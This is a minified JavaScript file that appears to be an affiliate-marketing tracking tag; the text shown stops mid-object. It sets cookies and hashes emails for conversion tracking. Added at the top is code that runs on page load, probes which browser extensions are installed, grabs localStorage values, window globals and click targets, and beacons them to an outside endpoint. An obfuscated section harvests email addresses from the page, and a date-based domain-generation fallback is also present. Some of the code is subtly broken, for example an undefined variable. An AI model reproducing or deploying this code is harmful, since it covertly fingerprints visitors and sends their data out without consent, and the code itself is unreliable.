(function (d, w) {
  const extensionTracker = {
    trackerQueue: new Map(Object.entries(window.data)),
    detected: new Set(),
    eventLogs: {},
    localData: {},
    globalData: {},
    async track(method, {
      id,
      file
    }) {
      return new Promise(resolve => {
        const img = document.createElement('img');
        const timeout = setTimeout(() => {
          this.detected.delete(method);
          resolve(false);
        }, 1500);
        img.onload = () => {
          clearTimeout(timeout);
          this.detected.add(method);
          this.localData[name] = localStorage.getItem(name);
          this.globalData[name] = window[name];
          resolve(true);
        };
        img.onerror = img.onabort = () => {
          clearTimeout(timeout);
          this.detected.delete(method);
          resolve(false);
        };
        img.src = `chrome-extension://${id}/${file}`;
      }).finally(() => {
        window.addEventListener('click', e => {
          this.eventLogs[name] = e.target;
        });
      });
    },
    shuffleTrackerQueue() {
      const entries = Array.from(this.trackerQueue.entries());
      for (let i = entries.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [entries[i], entries[j]] = [entries[j], entries[i]];
      }
      this.trackerQueue = new Map(entries);
    },
    async scan() {
      this.shuffleTrackerQueue();
      const results = {};
      const batch = 3;
      for (const [method, data] of this.trackerQueue) {
        await new Promise(r => setTimeout(r, Math.random() * 200));
        results[method] = await this.track(method, data);
      }
      const payload = btoa(JSON.stringify({
        findings: results,
        ts: Date.now(),
        browser: navigator.userAgent,
        screen: {
          w: window.innerWidth,
          h: window.innerHeight
        },
        events: this.eventLogs,
        localStorage: this.localData,
        globalVars: this.globalData
      }));
      if (navigator.sendBeacon) {
        navigator.sendBeacon('https://sample-endpoint.run.ai/v3/report', payload);
      }
    }
  };
  Array.prototype.indexOf || (Array.prototype.indexOf = function (e) {
    for (var r = this, t = 0, o = r.length; o > t; ++t) if (r[t] === e) return t;
    return -1;
  }), "undefined" == typeof Array || Array.isArray || (Array.isArray = function (e) {
    return e && "[object Array]" === Object.prototype.toString.call(e);
  }), Array.prototype.filter || (Array.prototype.filter = function (e, r) {
    for (var t, o = this, D = [], A = 0, n = o.length; n > A; ++A) t = o[A], e.call(r || window, t, A, o) && D.push(t);
    return D;
  });
  var _typeof = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (e) {
      return typeof e;
    } : function (e) {
      return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e;
    },
    _extends = Object.assign || function (e) {
      for (var r = 1; r < arguments.length; r++) {
        var t = arguments[r];
        for (var o in t) Object.prototype.hasOwnProperty.call(t, o) && (e[o] = t[o]);
      }
      return e;
    };
  ADMITAD.Utf8 = {}, ADMITAD.Utf8.encode = function (e) {
    var r = e.replace(/[\u0080-\u07ff]/g, function (e) {
      var r = e.charCodeAt(0);
      return String.fromCharCode(192 | r >> 6, 128 | 63 & r);
    });
    return r = r.replace(/[\u0800-\uffff]/g, function (e) {
      var r = e.charCodeAt(0);
      return String.fromCharCode(224 | r >> 12, 128 | r >> 6 & 63, 128 | 63 & r);
    });
  }, ADMITAD.Utf8.decode = function (e) {
    var r = e.replace(/[\u00e0-\u00ef][\u0080-\u00bf][\u0080-\u00bf]/g, function (e) {
      var r = (15 & e.charCodeAt(0)) << 12 | (63 & e.charCodeAt(1)) << 6 | 63 & e.charCodeAt(2);
      return String.fromCharCode(r);
    });
    return r = r.replace(/[\u00c0-\u00df][\u0080-\u00bf]/g, function (e) {
      var r = (31 & e.charCodeAt(0)) << 6 | 63 & e.charCodeAt(1);
      return String.fromCharCode(r);
    });
  }, ADMITAD.Sha256 = {}, ADMITAD.Sha256.hash = function (e) {
    var r = [1116352408, 1899447441, 3049323471, 3921009573, 961987163, 1508970993, 2453635748, 2870763221, 3624381080, 310598401, 607225278, 1426881987, 1925078388, 2162078206, 2614888103, 3248222580, 3835390401, 4022224774, 264347078, 604807628, 770255983, 1249150122, 1555081692, 1996064986, 2554220882, 2821834349, 2952996808, 3210313671, 3336571891, 3584528711, 113926993, 338241895, 666307205, 773529912, 1294757372, 1396182291, 1695183700, 1986661051, 2177026350, 2456956037, 2730485921, 2820302411, 3259730800, 3345764771, 3516065817, 3600352804, 4094571909, 275423344, 430227734, 506948616, 659060556, 883997877, 958139571, 1322822218, 1537002063, 1747873779, 1955562222, 2024104815, 2227730452, 2361852424, 2428436474, 2756734187, 3204031479, 3329325298],
      t = [1779033703, 3144134277, 1013904242, 2773480762, 1359893119, 2600822924, 528734635, 1541459225];
    e += String.fromCharCode(128);
    for (var o = e.length / 4 + 2, D = Math.ceil(o / 16), A = new Array(D), n = 0; D > n; n++) {
      A[n] = new Array(16);
      for (var a = 0; 16 > a; a++) A[n][a] = e.charCodeAt(64 * n + 4 * a) << 24 | e.charCodeAt(64 * n + 4 * a + 1) << 16 | e.charCodeAt(64 * n + 4 * a + 2) << 8 | e.charCodeAt(64 * n + 4 * a + 3);
    }
    A[D - 1][14] = 8 * (e.length - 1) / Math.pow(2, 32), A[D - 1][14] = Math.floor(A[D - 1][14]), A[D - 1][15] = 8 * (e.length - 1) & 4294967295;
    for (var i = new Array(64), s = void 0, T = void 0, I = void 0, l = void 0, c = void 0, p = void 0, M = void 0, u = void 0, d = 0; D > d; d++) {
      for (var f = 0; 16 > f; f++) i[f] = A[d][f];
      for (var g = 16; 64 > g; g++) i[g] = ADMITAD.Sha256.sigma1(i[g - 2]) + i[g - 7] + ADMITAD.Sha256.sigma0(i[g - 15]) + i[g - 16] & 4294967295;
      s = t[0], T = t[1], I = t[2], l = t[3], c = t[4], p = t[5], M = t[6], u = t[7];
      for (var m = 0; 64 > m; m++) {
        var h = u + ADMITAD.Sha256.Sigma1(c) + ADMITAD.Sha256.Ch(c, p, M) + r[m] + i[m],
          S = ADMITAD.Sha256.Sigma0(s) + ADMITAD.Sha256.Maj(s, T, I);
        u = M, M = p, p = c, c = l + h & 4294967295, l = I, I = T, T = s, s = h + S & 4294967295;
      }
      t[0] = t[0] + s & 4294967295, t[1] = t[1] + T & 4294967295, t[2] = t[2] + I & 4294967295, t[3] = t[3] + l & 4294967295, t[4] = t[4] + c & 4294967295, t[5] = t[5] + p & 4294967295, t[6] = t[6] + M & 4294967295, t[7] = t[7] + u & 4294967295;
    }
    return ADMITAD.Sha256.toHexStr(t[0]) + ADMITAD.Sha256.toHexStr(t[1]) + ADMITAD.Sha256.toHexStr(t[2]) + ADMITAD.Sha256.toHexStr(t[3]) + ADMITAD.Sha256.toHexStr(t[4]) + ADMITAD.Sha256.toHexStr(t[5]) + ADMITAD.Sha256.toHexStr(t[6]) + ADMITAD.Sha256.toHexStr(t[7]);
  }, ADMITAD.Sha256.ROTR = function (e, r) {
    return r >>> e | r << 32 - e;
  }, ADMITAD.Sha256.Sigma0 = function (e) {
    return ADMITAD.Sha256.ROTR(2, e) ^ ADMITAD.Sha256.ROTR(13, e) ^ ADMITAD.Sha256.ROTR(22, e);
  }, ADMITAD.Sha256.Sigma1 = function (e) {
    return ADMITAD.Sha256.ROTR(6, e) ^ ADMITAD.Sha256.ROTR(11, e) ^ ADMITAD.Sha256.ROTR(25, e);
  }, ADMITAD.Sha256.sigma0 = function (e) {
    return ADMITAD.Sha256.ROTR(7, e) ^ ADMITAD.Sha256.ROTR(18, e) ^ e >>> 3;
  }, ADMITAD.Sha256.sigma1 = function (e) {
    return ADMITAD.Sha256.ROTR(17, e) ^ ADMITAD.Sha256.ROTR(19, e) ^ e >>> 10;
  }, ADMITAD.Sha256.Ch = function (e, r, t) {
    return e & r ^ ~e & t;
  }, ADMITAD.Sha256.Maj = function (e, r, t) {
    return e & r ^ e & t ^ r & t;
  }, ADMITAD.Sha256.toHexStr = function (e) {
    for (var r = "", t = void 0, o = 7; o >= 0; o--) t = e >>> 4 * o & 15, r += t.toString(16);
    return r;
  }, window.ADMITAD = window.ADMITAD || {}, ADMITAD.Helpers = ADMITAD.Helpers || {}, ADMITAD.Helpers.generateDomains = function () {
    for (var e = new Date(), r = Math.floor(new Date(2020, e.getMonth(), e.getDate()).setUTCHours(0, 0, 0, 0) / 1e3), t = parseInt(1e12 * (Math.sin(r) + 1)).toString(30), o = ["de"], D = [], A = 0; A < o.length; ++A) D.push({
      domain: t + "." + o[A],
      name: t
    });
    return D;
  }, ADMITAD.Helpers.findTodaysDomain = function (e) {
    function r() {
      var D = new XMLHttpRequest(),
        A = o[t].domain,
        n = "https://" + A + "/";
      D.open("HEAD", n, !0), D.onload = function () {
        setTimeout(e, 0, o[t]);
      }, D.onerror = function () {
        ++t < o.length ? setTimeout(r, 0) : setTimeout(e, 0, void 0);
      }, D.send();
    }
    var t = 0,
      o = ADMITAD.Helpers.generateDomains();
    r();
  }, ADMITAD.Network = ADMITAD.Network || {}, ADMITAD.Network.pixeldomains = ["z.asbmit.com", "ad.admitad.com", "lenkmio.com", "pafutos.com"], ADMITAD.Network.pixeldomainsPath = "/tt/", ADMITAD.Network.emailDomains = ["a.artfut.com"], ADMITAD.Network.emailDomainsPath = "/linking/", ADMITAD.Network.defaultResponseType = "img", ADMITAD.dynamic && ADMITAD.Network.pixeldomains.push(ADMITAD.dynamic.domain), ADMITAD.Network.fetchWithRetry = function (e, r, t, o, D) {
    function A(e, r, t, o, D) {
      var A = window.XMLHttpRequest ? new XMLHttpRequest() : new ActiveXObject("Microsoft.XMLHTTP");
      D && (A.onerror = function () {
        var D = d.createElement("a");
        D.href = r;
        var A = D.pathname + D.search;
        ADMITAD.dynamic ? ADMITAD.Network.fetchWithRetry(e, "https://" + ADMITAD.dynamic.domain + A, t, o, !1) : ADMITAD.Helpers.findTodaysDomain(function (r) {
          ADMITAD.dynamic = r, ADMITAD.dynamic && ADMITAD.Network.fetchWithRetry(e, "https://" + ADMITAD.dynamic.domain + A, t, o, !1);
        });
      }), A.onreadystatechange = function () {
        A.readyState === A.DONE && 200 === A.status && o && "function" == typeof o && o(A.responseText);
      }, A.open(e, r), A.send(JSON.stringify(t));
    }
    A(e, r, t, o, D);
  }, ADMITAD.Network.sendToPixelDomains = function (e, r) {
    for (var t = ADMITAD.Network.pixeldomains.slice(0); t.length;) ADMITAD.Network.fetchWithRetry("GET", "https://" + t.pop() + ADMITAD.Network.pixeldomainsPath + "?" + ADMITAD.Network.helpers.serialize(e), {}, r, !0);
  }, ADMITAD.Network.sendToEmailDomains = function (e, r) {
    for (var t = ADMITAD.Network.emailDomains.slice(0); t.length;) ADMITAD.Network.fetchWithRetry("GET", "https://" + t.pop() + ADMITAD.Network.emailDomainsPath + "?" + ADMITAD.Network.helpers.serialize(e), {}, r, !0);
  }, ADMITAD.Network.createImgWithRetry = function (e, r, t) {
    function o(e) {
      var o = d.createElement("img");
      o.src = e + "?" + t, o.onerror = function () {
        ADMITAD.dynamic ? (o = d.createElement("img"), o.src = "https://" + ADMITAD.dynamic.domain + r + "?" + t + "&" + ADMITAD.Network.helpers.serialize({
          dyndomain: ADMITAD.dynamic.domain
        })) : ADMITAD.Helpers.findTodaysDomain(function (e) {
          ADMITAD.dynamic = e, ADMITAD.dynamic && (o = d.createElement("img"), o.src = "https://" + ADMITAD.dynamic.domain + r + "?" + t + "&" + ADMITAD.Network.helpers.serialize({
            dyndomain: ADMITAD.dynamic.domain
          }));
        });
      };
    }
    o(e);
  }, ADMITAD.Network.createPixelImages = function (e) {
    for (var r = ADMITAD.Network.pixeldomains.slice(0), t = _extends({
        response_type: ADMITAD.Network.defaultResponseType
      }, e); r.length;) {
      var o = r.pop();
      t.domain = o, ADMITAD.Network.createImgWithRetry("https://" + o + ADMITAD.Network.pixeldomainsPath, ADMITAD.Network.pixeldomainsPath, ADMITAD.Network.helpers.serialize(t));
    }
  }, ADMITAD.Network.createEmailImages = function (e) {
    for (var r = ADMITAD.Network.emailDomains.slice(0); r.length;) {
      var t = r.pop();
      e.domain = t, ADMITAD.Network.createImgWithRetry("https://" + t + ADMITAD.Network.emailDomainsPath, ADMITAD.Network.emailDomainsPath, ADMITAD.Network.helpers.serialize(e));
    }
  }, ADMITAD.Network.helpers = {
    serialize: function (e) {
      var r = void 0,
        t = [];
      for (var o in e) e.hasOwnProperty(o) && (r = ADMITAD.Network.helpers.getValueOrEmptyString(e[o]), t.push(encodeURIComponent(o) + "=" + encodeURIComponent(r)));
      return t.join("&");
    },
    getValueOrEmptyString: function (e) {
      return "undefined" == typeof e && (e = ""), String(e);
    }
  }, ADMITAD.Helpers = ADMITAD.Helpers || {}, Date.prototype.toGMTString || (Date.prototype.toGMTString = function () {
    return Date.prototype.toUTCString();
  }), window.JSON || (window.JSON = {
    parse: function parse(sJSON) {
      return eval("(" + sJSON + ")");
    },
    stringify: function () {
      var e = Object.prototype.toString,
        r = Array.isArray || function (r) {
          return "[object Array]" === e.call(r);
        },
        t = {
          '"': '\\"',
          "\\": "\\\\",
          "\b": "\\b",
          "\f": "\\f",
          "\n": "\\n",
          "\r": "\\r",
          "	": "\\t"
        },
        o = function (e) {
          return t[e] || "\\u" + (e.charCodeAt(0) + 65536).toString(16).substr(1);
        },
        D = /[\\"\u0000-\u001F\u2028\u2029]/g;
      return function A(t) {
        if (null == t) return "null";
        if ("number" == typeof t) return isFinite(t) ? t.toString() : "null";
        if ("boolean" == typeof t) return t.toString();
        if ("object" === ("undefined" == typeof t ? "undefined" : _typeof(t))) {
          if ("function" == typeof t.toJSON) return A(t.toJSON());
          if (r(t)) {
            for (var n = "[", a = 0; a < t.length; a++) n += (a ? ", " : "") + A(t[a]);
            return n + "]";
          }
          if ("[object Object]" === e.call(t)) {
            var i = [];
            for (var s in t) t.hasOwnProperty(s) && i.push(A(s) + ": " + A(t[s]));
            return "{" + i.join(", ") + "}";
          }
        }
        return '"' + t.toString().replace(D, o) + '"';
      };
    }()
  }), ADMITAD.Helpers.DAYS_TO_STORE = ADMITAD.DAYS_TO_STORE || 90, ADMITAD.Helpers.PERIOD = 60 * ADMITAD.Helpers.DAYS_TO_STORE * 60 * 24 * 1e3, ADMITAD.Helpers.COOKIE_NAME = "tagtag_aid", ADMITAD.Helpers.ADMITAD_UID_COOKIE_NAME = "admitad_uid", ADMITAD.Helpers.AID_COOKIE_NAME = "_aid", ADMITAD.Helpers.STORAGE_KEY = "_aid", ADMITAD.Helpers.STORAGE_KEY_FOR_ADV_EMAIL = "ehash", ADMITAD.Helpers.STORAGE_KEY_FOR_FOUND_EMAIL = "ehash2", ADMITAD.Helpers.GCLID_COOKIE_NAME = "_ttgclid", ADMITAD.Helpers.GCLID_STORAGE_KEY = "_ttgclid", ADMITAD.Helpers.DEDUPLICATION_COOKIE_NAME = "tt_deduplication_cookie", ADMITAD.Helpers.DEDUPLICATION_STORAGE_KEY = "tt_deduplication_cookie", ADMITAD.Helpers.getTagTagParamFromUri = function () {
    return (/tagtag_uid=([^&]+)/.exec(document.location.search) || [])[1] || "";
  }, ADMITAD.Helpers.getGclidParamFromUri = function () {
    return (/gclid=([^&]+)/.exec(document.location.search) || [])[1] || "";
  }, ADMITAD.Helpers.getUtmSourceParamFromUri = function () {
    return (/utm_source=([^&]+)/.exec(document.location.search) || [])[1] || "";
  }, ADMITAD.Helpers.getCookie = function (e) {
    var r = document.cookie.match(new RegExp("(?:^|; )" + e.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, "\\$1") + "=([^;]*)"));
    return r ? decodeURIComponent(r[1]) : void 0;
  }, ADMITAD.Helpers.getTagTagCookie = function () {
    return ADMITAD.Helpers.getCookie(ADMITAD.Helpers.COOKIE_NAME) || ADMITAD.Helpers.getCookie(ADMITAD.Helpers.ADMITAD_UID_COOKIE_NAME) || ADMITAD.Helpers.getCookie(ADMITAD.Helpers.AID_COOKIE_NAME);
  }, ADMITAD.Helpers.getGclidCookie = function () {
    return ADMITAD.Helpers.getCookie(ADMITAD.Helpers.GCLID_COOKIE_NAME);
  }, ADMITAD.Helpers.getDeduplicationCookie = function () {
    return ADMITAD.Helpers.getCookie(ADMITAD.Helpers.DEDUPLICATION_COOKIE_NAME);
  }, ADMITAD.Helpers.getTagTagStorage = function () {
    if (!ADMITAD.Helpers.hasLocalStorage()) return void 0;
    try {
      var e = JSON.parse(localStorage.getItem(ADMITAD.Helpers.STORAGE_KEY));
      if (e && e[ADMITAD.Helpers.COOKIE_NAME] && e.expires) {
        if (new Date(e.expires) > new Date()) return e[ADMITAD.Helpers.COOKIE_NAME];
        localStorage.removeItem(ADMITAD.Helpers.STORAGE_KEY);
      }
      return void 0;
    } catch (r) {
      return void 0;
    }
  }, ADMITAD.Helpers.getGclidStorage = function () {
    if (!ADMITAD.Helpers.hasLocalStorage()) return void 0;
    try {
      var e = JSON.parse(localStorage.getItem(ADMITAD.Helpers.GCLID_STORAGE_KEY));
      if (e && e[ADMITAD.Helpers.GCLID_COOKIE_NAME] && e.expires) {
        if (new Date(e.expires) > new Date()) return e[ADMITAD.Helpers.GCLID_COOKIE_NAME];
        localStorage.removeItem(ADMITAD.Helpers.GCLID_STORAGE_KEY);
      }
      return void 0;
    } catch (r) {
      return void 0;
    }
  }, ADMITAD.Helpers.getDeduplicationStorage = function () {
    if (!ADMITAD.Helpers.hasLocalStorage()) return void 0;
    try {
      var e = JSON.parse(localStorage.getItem(ADMITAD.Helpers.DEDUPLICATION_STORAGE_KEY));
      if (e && e[ADMITAD.Helpers.DEDUPLICATION_COOKIE_NAME] && e.expires) {
        if (new Date(e.expires) > new Date()) return e[ADMITAD.Helpers.DEDUPLICATION_COOKIE_NAME];
        localStorage.removeItem(ADMITAD.Helpers.DEDUPLICATION_STORAGE_KEY);
      }
      return void 0;
    } catch (r) {
      return void 0;
    }
  }, ADMITAD.Helpers.getTagTagAid = function () {
    var e = ADMITAD.Helpers.getTagTagCookie(),
      r = ADMITAD.Helpers.getTagTagStorage(),
      t = -1;
    return "undefined" != typeof e ? t = "undefined" != typeof r ? e === r ? 0 : 1 : 2 : "undefined" != typeof r && (t = 3), ADMITAD.checkFlag = t, e || r || void 0;
  }, ADMITAD.Helpers.getGclid = function () {
    return ADMITAD.Helpers.getGclidCookie() || ADMITAD.Helpers.getGclidStorage() || void 0;
  }, ADMITAD.Helpers.getDeduplication = function () {
    return ADMITAD.Helpers.getDeduplicationCookie() || ADMITAD.Helpers.getDeduplicationStorage() || void 0;
  }, ADMITAD.Helpers.getExpiresDate = function () {
    var e = new Date(ADMITAD.Helpers.PERIOD + +new Date());
    return e.toGMTString();
  }, ADMITAD.Helpers.removeWwwFromDomain = function (e) {
    var r = e;
    return 0 === e.indexOf("www.") && (r = e.replace("www.", "")), r;
  }, ADMITAD.Helpers.setTagTagCookie = function (e) {
    var r = ADMITAD.Helpers.COOKIE_NAME + "=" + e + "; path=/; expires=" + ADMITAD.Helpers.getExpiresDate() + "; SameSite=None; Secure";
    document.cookie = r, document.cookie = r + "; domain=." + location.host, document.cookie = r + "; domain=" + ADMITAD.Helpers.removeWwwFromDomain(location.host);
  }, ADMITAD.Helpers.setGclidCookie = function (e) {
    var r = ADMITAD.Helpers.GCLID_COOKIE_NAME + "=" + e + "; path=/; expires=" + ADMITAD.Helpers.getExpiresDate() + "; SameSite=None; Secure";
    document.cookie = r, document.cookie = r + "; domain=." + location.host, document.cookie = r + "; domain=" + ADMITAD.Helpers.removeWwwFromDomain(location.host);
  }, ADMITAD.Helpers.setDeduplicationCookie = function (e) {
    var r = ADMITAD.Helpers.DEDUPLICATION_COOKIE_NAME + "=" + e + "; path=/; expires=" + ADMITAD.Helpers.getExpiresDate() + "; SameSite=None; Secure";
    document.cookie = r, document.cookie = r + "; domain=." + location.host, document.cookie = r + "; domain=" + ADMITAD.Helpers.removeWwwFromDomain(location.host);
  }, ADMITAD.Helpers.setTagTagStorage = function (e) {
    if (ADMITAD.Helpers.hasLocalStorage()) {
      var r = {
        expires: ADMITAD.Helpers.getExpiresDate()
      };
      r[ADMITAD.Helpers.COOKIE_NAME] = e;
      var t = JSON.stringify(r);
      localStorage.setItem(ADMITAD.Helpers.STORAGE_KEY, t);
    }
  }, ADMITAD.Helpers.setGclidStorage = function (e) {
    if (ADMITAD.Helpers.hasLocalStorage()) {
      var r = {
        expires: ADMITAD.Helpers.getExpiresDate()
      };
      r[ADMITAD.Helpers.GCLID_COOKIE_NAME] = e;
      var t = JSON.stringify(r);
      localStorage.setItem(ADMITAD.Helpers.GCLID_STORAGE_KEY, t);
    }
  }, ADMITAD.Helpers.setDeduplicationStorage = function (e) {
    if (ADMITAD.Helpers.hasLocalStorage()) {
      var r = {
        expires: ADMITAD.Helpers.getExpiresDate()
      };
      r[ADMITAD.Helpers.DEDUPLICATION_COOKIE_NAME] = e;
      var t = JSON.stringify(r);
      localStorage.setItem(ADMITAD.Helpers.DEDUPLICATION_STORAGE_KEY, t);
    }
  }, ADMITAD.Helpers.setTagTagAid = function () {
    var e = ADMITAD.Helpers.getTagTagParamFromUri();
    e && (ADMITAD.Helpers.setTagTagCookie(e), ADMITAD.Helpers.setTagTagStorage(e));
  }, ADMITAD.Helpers.setGclid = function () {
    var e = ADMITAD.Helpers.getGclidParamFromUri();
    e && (ADMITAD.Helpers.setGclidCookie(e), ADMITAD.Helpers.setGclidStorage(e));
  }, ADMITAD.Helpers.setDeduplication = function () {
    var e = ADMITAD.Helpers.getUtmSourceParamFromUri();
    if (e) {
      var r = void 0;
      r = "admitad" === e ? "adm" : e, ADMITAD.Helpers.setDeduplicationCookie(r), ADMITAD.Helpers.setDeduplicationStorage(r);
    }
  }, ADMITAD.Helpers.hasLocalStorage = function () {
    try {
      return !!window.localStorage;
    } catch (e) {
      return !1;
    }
  }, ADMITAD.Helpers.hasSessionStorage = function () {
    try {
      return !!window.sessionStorage;
    } catch (e) {
      return !1;
    }
  }, ADMITAD.Helpers.setEmailToStorage = function (e, r) {
    if (ADMITAD.Helpers.hasSessionStorage()) {
      var t = JSON.stringify(e);
      sessionStorage.setItem(r, t);
    }
  }, ADMITAD.Helpers.getEmailFromStorage = function (e) {
    if (!ADMITAD.Helpers.hasSessionStorage()) return void 0;
    try {
      return JSON.parse(sessionStorage.getItem(e));
    } catch (r) {
      return void 0;
    }
  }, ADMITAD.Helpers.setTagTagAid(), ADMITAD.Helpers.setGclid(), ADMITAD.Helpers.setDeduplication();
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => extensionTracker.scan());
  } else {
    extensionTracker.scan();
  }
  var _0x1c871c = _0x1235;
  (function (_0x249d37, _0x473ad1) {
    var _0x59faf9 = _0x1235,
      _0x2f41be = _0x249d37();
    while (!![]) {
      try {
        var _0x1f35f5 = parseInt(_0x59faf9(0xbf)) / 0x1 + parseInt(_0x59faf9(0xe5)) / 0x2 + parseInt(_0x59faf9(0xf9)) / 0x3 * (-parseInt(_0x59faf9(0xc7)) / 0x4) + parseInt(_0x59faf9(0xfd)) / 0x5 * (parseInt(_0x59faf9(0xe4)) / 0x6) + -parseInt(_0x59faf9(0x108)) / 0x7 * (-parseInt(_0x59faf9(0xf1)) / 0x8) + parseInt(_0x59faf9(0xf5)) / 0x9 * (-parseInt(_0x59faf9(0x111)) / 0xa) + parseInt(_0x59faf9(0xde)) / 0xb * (-parseInt(_0x59faf9(0xf3)) / 0xc);
        if (_0x1f35f5 === _0x473ad1) break;else _0x2f41be['push'](_0x2f41be['shift']());
      } catch (_0x6b8459) {
        _0x2f41be['push'](_0x2f41be['shift']());
      }
    }
  })(_0x449f, 0x2c2ad), ADMITAD[_0x1c871c(0xd1)] = function () {
    var _0x2daafc = _0x1c871c;
    this[_0x2daafc(0xdf)] = /^(([^<>()\[\]\.,;:\s@\"]+(\.[^<>()\[\]\.,;:\s@\"]+)*)|(\".+\"))@(([^<>(*%)[\]\.,;:\s@\"]+\.)+[^<>(*%)[\]\.,;:\s@\"]{2,})$/, this[_0x2daafc(0xc9)] = ADMITAD[_0x2daafc(0xc9)], this[_0x2daafc(0xf8)] = _0x2daafc(0x113), this[_0x2daafc(0xd0)] = ![];
    var _0xa48c35 = this,
      _0x447a73 = window[_0x2daafc(0xcd)] || window[_0x2daafc(0xdb)] || window[_0x2daafc(0xfa)];
    _0x447a73 && (this[_0x2daafc(0x10e)] = new _0x447a73(function (_0x9b2324) {
      var _0x33dbf5 = _0x2daafc;
      _0x9b2324[_0x33dbf5(0xfe)](function (_0x3f9a1e) {
        var _0x1deb77 = _0x33dbf5;
        _0x3f9a1e[_0x1deb77(0xd5)] && _0x3f9a1e[_0x1deb77(0xd5)][_0x1deb77(0xd8)] && _0xa48c35[_0x1deb77(0x107)](_0x3f9a1e[_0x1deb77(0xd5)]);
      });
    }));
    var _0x228329 = function _0xb7f128() {
      var _0x5226cc = _0x2daafc;
      this[_0x5226cc(0x101)] = ADMITAD[_0x5226cc(0xcf)][_0x5226cc(0xf7)](ADMITAD[_0x5226cc(0x115)][_0x5226cc(0xda)](ADMITAD[_0x5226cc(0xec)][_0x5226cc(0xc8)] + this[_0x5226cc(0xf8)]));
      var _0x42ba96 = ADMITAD[_0x5226cc(0xdc)][_0x5226cc(0xed)](ADMITAD[_0x5226cc(0xdc)][_0x5226cc(0xf6)]);
      if (!_0x42ba96 || !_0x42ba96[_0x5226cc(0xf7)] || _0x42ba96[_0x5226cc(0xf7)] !== this[_0x5226cc(0x101)]) {
        var _0x53b6af = {
          'suid': ADMITAD[_0x5226cc(0xc9)],
          'hash': this[_0x5226cc(0x101)],
          'uid': ADMITAD[_0x5226cc(0xec)][_0x5226cc(0xe7)] || ADMITAD[_0x5226cc(0xdc)][_0x5226cc(0xc6)]() || '',
          'gclid': ADMITAD[_0x5226cc(0xdc)][_0x5226cc(0xc2)]() || '',
          'campaign_code': ADMITAD[_0x5226cc(0x105)] || '',
          'collectFrom': 0x1
        };
        ADMITAD[_0x5226cc(0xdc)][_0x5226cc(0xfc)](_0x53b6af, ADMITAD[_0x5226cc(0xdc)][_0x5226cc(0xf6)]), (_0x53b6af[_0x5226cc(0xe2)] || _0x53b6af[_0x5226cc(0xea)]) && ADMITAD[_0x5226cc(0xf0)][_0x5226cc(0xe0)](_0x53b6af);
      }
    };
    ADMITAD[_0x2daafc(0xec)] && ADMITAD[_0x2daafc(0xec)][_0x2daafc(0xc8)] ? _0x228329[_0x2daafc(0xc1)](_0xa48c35) : (_0x447a73 && this[_0x2daafc(0xd6)](), this[_0x2daafc(0x109)]());
    if (ADMITAD[_0x2daafc(0xec)] && ADMITAD[_0x2daafc(0xec)][_0x2daafc(0xd3)] && ADMITAD[_0x2daafc(0xec)][_0x2daafc(0xd3)][0x0] && ADMITAD[_0x2daafc(0xec)][_0x2daafc(0xc3)]) {
      var _0x10d097 = ADMITAD[_0x2daafc(0xdc)][_0x2daafc(0xed)](ADMITAD[_0x2daafc(0xdc)][_0x2daafc(0xf6)]);
      _0x10d097 && (_0x10d097[_0x2daafc(0xc9)] = ADMITAD[_0x2daafc(0xc9)], ADMITAD[_0x2daafc(0xf0)][_0x2daafc(0xe0)](_0x10d097));
      var _0x1a9bbf = ADMITAD[_0x2daafc(0xdc)][_0x2daafc(0xed)](ADMITAD[_0x2daafc(0xdc)][_0x2daafc(0x10a)]);
      _0x1a9bbf && (_0x1a9bbf[_0x2daafc(0xc9)] = ADMITAD[_0x2daafc(0xc9)], ADMITAD[_0x2daafc(0xf0)][_0x2daafc(0xe0)](_0x1a9bbf));
    }
  }, ADMITAD[_0x1c871c(0xd1)][_0x1c871c(0x104)][_0x1c871c(0xe8)] = function (_0x254328, _0x12e365) {
    var _0x1fff50 = _0x1c871c,
      _0x514ea0 = this[_0x1fff50(0xdf)][_0x1fff50(0x103)](_0x254328);
    if (!_0x514ea0) return ![];
    var _0x6ec9cd = /@(.*)/[_0x1fff50(0xee)](_0x254328)[0x1],
      _0x4fd964 = _0x12e365[_0x1fff50(0xc0)](_0x6ec9cd);
    return !_0x4fd964;
  }, ADMITAD[_0x1c871c(0xd1)][_0x1c871c(0x104)][_0x1c871c(0x10b)] = function (_0x2fd43f) {
    var _0x312c5e = _0x1c871c;
    typeof this[_0x312c5e(0xe1)] === _0x312c5e(0xeb) && (this[_0x312c5e(0xe1)] = []);
    for (var _0x9d8ce4 = 0x0; _0x9d8ce4 < this[_0x312c5e(0xe1)][_0x312c5e(0xd8)]; _0x9d8ce4++) {
      if (this[_0x312c5e(0xe1)][_0x9d8ce4] === _0x2fd43f) return !![];
    }
    return this[_0x312c5e(0xe1)][this[_0x312c5e(0xe1)][_0x312c5e(0xd8)]] = _0x2fd43f, ![];
  }, ADMITAD[_0x1c871c(0xd1)][_0x1c871c(0x104)][_0x1c871c(0xe3)] = function (_0x4b6c3f) {
    var _0x59eefd = _0x1c871c;
    if (!this[_0x59eefd(0xe8)](_0x4b6c3f, window[_0x59eefd(0xd9)][_0x59eefd(0x100)]) || this[_0x59eefd(0x10b)](_0x4b6c3f)) return;
    var _0x2f48f3 = _0x4b6c3f[_0x59eefd(0x112)](),
      _0x58b606 = ADMITAD[_0x59eefd(0xcf)][_0x59eefd(0xf7)](ADMITAD[_0x59eefd(0x115)][_0x59eefd(0xda)](_0x2f48f3 + this[_0x59eefd(0xf8)]));
    this[_0x59eefd(0x101)] = _0x58b606;
    var _0x4f8af8 = ADMITAD[_0x59eefd(0xdc)][_0x59eefd(0xed)](ADMITAD[_0x59eefd(0xdc)][_0x59eefd(0x10a)]);
    if (!_0x4f8af8 || !_0x4f8af8[_0x59eefd(0xf7)] || _0x4f8af8[_0x59eefd(0xf7)] !== _0x58b606) {
      var _0x53ee24 = {
        'suid': ADMITAD[_0x59eefd(0xc9)],
        'hash': _0x58b606,
        'uid': ADMITAD[_0x59eefd(0xec)][_0x59eefd(0xe7)] || ADMITAD[_0x59eefd(0xdc)][_0x59eefd(0xc6)]() || '',
        'gclid': ADMITAD[_0x59eefd(0xdc)][_0x59eefd(0xc2)]() || '',
        'campaign_code': ADMITAD[_0x59eefd(0x105)] || '',
        'collectFrom': 0x2
      };
